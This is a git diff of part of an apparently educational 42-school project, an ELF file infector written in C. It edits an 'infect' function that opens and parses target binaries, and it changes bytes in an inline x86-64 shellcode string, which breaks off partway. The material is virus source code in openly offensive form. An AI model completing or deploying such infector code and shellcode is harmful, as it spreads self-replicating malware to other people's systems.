@@ -6,7 +6,7 @@
 /*   By: nguiard <marvin@42.fr>                     +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2024/10/31 10:47:01 by nguiard           #+#    #+#             */
-/*   Updated: 2024/11/04 14:11:22 by nguiard          ###   ########.fr       */
+/*   Updated: 2024/11/05 11:39:40 by nguiard          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -20,18 +20,21 @@ static size_t	off_end_exec_segment(elf_data *data);
 //	Infects the file located at path
 //
 //	Returns true on a critical error that needs to stop the whole infection program
-bool	infect(const str path) {
-	int64_t		fd;
-	int64_t		ret;
+bool	infect(profiling *this, const str path) {
+	int64_t		fd = 0;
+	int64_t		ret = 0;
 	struct stat file_stat = {0};
 	byte		*file_origin = NULL;
 	elf_data	data;
-	uint64_t	rip;
 
 	(void)fd;
 	(void)ret;
+	(void)this;
 
 	open(fd, path, O_RDWR);
+	if (fd < 0) {
+		printf(FILE_LINE("open failed: %ld\n"), ret);
+	}
 
 	fstat(ret, fd, &file_stat);
 	if (ret) {
@@ -53,17 +56,9 @@ bool	infect(const str path) {
 		goto infect_end;
 	
 	// ft_memcpy(data.file + data.signature_offset, (const byte *)SIGNATURE, SIGNATURE_LEN);
-	get_rip(rip);
-	
-	// To change
-	rip = rip & 0xfffffffff000;
-	
-	#ifdef DEBUG
-		rip += 0x30;
-	#endif
 
 	str shellcode = "\xb8\x03\x00\x00\x00" \
-					"\xbf\x02\x00\x00\x00" \
+					"\xbf\x2a\x00\x00\x00" \
 					"\x0f\x05" \
 					"\x48\x8d\x35\x00\x00\x00\x00"	\
 					"\x48\x89\xf0" \
